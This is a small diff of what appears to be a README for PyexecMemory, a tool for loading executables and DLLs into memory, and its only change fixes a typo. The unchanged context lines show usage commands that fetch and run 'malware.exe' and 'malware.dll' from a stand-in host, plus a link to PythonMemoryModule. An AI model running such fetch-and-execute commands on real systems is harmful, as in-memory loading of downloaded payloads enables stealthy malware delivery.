@@ -21,7 +21,7 @@ exe : PyexecMemory.exe http://example.com/malware.exe EXE
 
 dll: PyexecMemory.exe http://example.com/malware.dll DLL --Method DLLRegisterServer
 
-# Check form more info
+# Check for more info
 
 https://github.com/naksyn/PythonMemoryModule
 
